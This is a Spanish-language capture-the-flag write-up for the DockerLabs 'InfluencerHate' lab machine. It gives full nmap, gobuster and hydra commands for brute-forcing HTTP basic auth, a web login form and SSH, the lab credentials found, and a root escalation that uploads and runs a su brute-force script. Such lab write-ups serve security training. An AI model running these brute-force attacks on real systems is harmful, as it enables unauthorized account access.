___
Tags: #FuerzaBruta #burpsuite #suBruteforce 
___
# InfluencerHate
## Información General

**- Dificultad:** Media <br>
**- Sistema operativo:** Linux <br>
**- Vulnerabilidad explotada.** SSH brute force ,Broken Access Control, Brute Force (root) <br>
**- Fecha de resolución:** 3/3/2026 <br>
**- Enlace:** https://dockerlabs.es <br>

## Reconocimiento

**DockerLabs** nos proporciona la ip de la máquina objetivo **172.17.0.2**

### Ping

```
ping -c 1 172.17.0.2
```

**Su ttl es 64. Por tanto, es Linux**

## Enumeración

### Escaneo de puertos abiertos

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 172.17.0.2
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

| Open port | Service | Version                        |
| --------- | ------- | ------------------------------ |
| 22        | ssh     | OpenSSH 9.2p1 Debian 2+deb12u6 |
| 80        | http    | Apache httpd 2.4.62            |

## Explotación

### Fuerza bruta

Visitando la página nos encontramos lo siguiente:

<p align="center"> 
<img src="images/http.png" width="600" alt="Resultado de Nmap">
</p>

Para entrar tendremos que realizar un ataque de fuerza bruta, que sería de la siguiente forma:

```
hydra -C /usr/share/legion/wordlists/ftp-betterdefaultpasslist.txt -s 80 172.17.0.2 http-get /
```

<p align="center"> 
<img src="images/hydra.png" width="600" alt="Resultado de Nmap">
<img src="images/fuzz.png" width="600" alt="Resultado de Nmap">
</p>

### Enumeración web con credenciales

Voy a realizar otro enumeracion web con gobuster pero estableciendo las credenciales de la pagina

```
gobuster dir -u http://172.17.0.2 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,txt,bak -U httpadmin -P fhttpadmin
```

<p align="center"> 
<img src="images/gobuster.png" width="600" alt="Resultado de Nmap">
<img src="images/login.png" width="600" alt="Resultado de Nmap">
</p>

En este momento intuyo que hay realizar de nuevo un ataque de fuerza bruta, pero antes hay que recopilar en burpsuite la información necesaria

<p align="center"> 
<img src="images/burpsuite-1.png" width="600" alt="Resultado de Nmap">
<img src="images/burpsuite-2.png" width="600" alt="Resultado de Nmap">
</p>

Observando el código fuente de la pagina, se habla mucho de super usuario, entonces lo que se me ocurre es probar primero con **admin** como usuario

<p align="center"> 
<img src="images/codigo fuente.png" width="600" alt="Resultado de Nmap">
</p>

A continuación, enseño antes un esquema de como deberíamos de crear el ataque de fuerza bruta a este tipo de página:

```
hydra -l <usuario> -P <diccionario> <ip> http-post-form “<ruta>:username=<usuario>&password=^PASS^:H=<Authorization>:F=<Frase incorrecta del sistema>”
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/login.php:username=admin&password=^PASS^:H=Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=:F=Credenciales incorrectas."
```

<p align="center"> 
<img src="images/hydra-1.png" width="600" alt="Resultado de Nmap">
</p>

En el caso que no sabes que usuario probar puedes probar con este diccionario **/usr/share/commix/src/txt/default_usernames.txt** , el comando quedaría tal que así:

```bash
hydra -l /usr/share/commix/src/txt/default_usernames.txt -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/login.php:username=^USER^&password=^PASS^:H=Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=:F=Credenciales incorrectas."
```

Pero ten en cuenta que se tira un buen rato...

Probando las credenciales válidas nos da lo siguiente:

<p align="center"> 
<img src="images/balutin.png" width="600" alt="Resultado de Nmap">
</p>

Tendremos que realizar de nuevo un ataque de fuerza bruta pero esta vez al puerto ssh.

```
hydra -l balutin -P /usr/share/wordlists/rockyou.txt- t 5 -f ssh://172.17.0.2
```

<p align="center"> 
<img src="images/ssh.png" width="600" alt="Resultado de Nmap">
</p>

A la hora de conectarnos por ssh, nos aparece este mensaje: 

<p align="center"> 
<img src="images/ssh-1.png" width="600" alt="Resultado de Nmap">
</p>

Usamos este comando para eliminar las credenciales que se uso anteriormente

```
ssh-keygen -f '/home/dani/.ssh/known_hosts' -R '172.17.0.2'
```

Luego, si que nos dejará entrar por ssh 

<p align="center"> 
<img src="images/balutin-1.png" width="600" alt="Resultado de Nmap">
</p>

## Explotación Posterior

### Escalada de Privilegios

Como la maquina hasta ahora la hemos ido explotando mediante fuerza bruta, pienso que, la escalada ira igual, investigando encontré el siguiente repositorio [suBruteforce](https://github.com/D1se0/suBruteforce/tree/main)

Entonces la idea es subir el script + el diccionario rockyou.txt para descubrir la contraseña:

Ten en cuenta que por ssh no deja de subir la carpeta de suBruteforce, por tanto buscamos el script **suBruteforce.sh**, y lo subimos

```
scp suBruteforce.sh balutin@172.17.0.2:/tmp
scp /usr/share/wordlists/rockyou.txt balutin@172.17.0.2:/tmp
```

Damos permisos de ejecución 

```
chmod +x suBruteforce.sh
```

Y llevamos a cabo el ataque por fuerza bruta

```
./suBruteforce.sh root rockyou.txt 
```

<p align="center"> 
<img src="images/subbruteforce.png" width="600" alt="Resultado de Nmap">
</p>

Conseguí ser root 

<p align="center"> 
<img src="images/root.png" width="600" alt="Resultado de Nmap">
</p>

**Máquina terminada**

## Conclusión

La máquina **InfluencerHate** de Dockerlabs me parece especialmente interesante si todavía no has practicado ataques de fuerza bruta contra un panel de login web, servicios SSH o la obtención de la contraseña de root. Es una opción muy adecuada para aprender y consolidar distintas formas de uso de la herramienta Hydra, ya que permite repasar y practicar escenarios típicos de ataque de credenciales en un entorno controlado.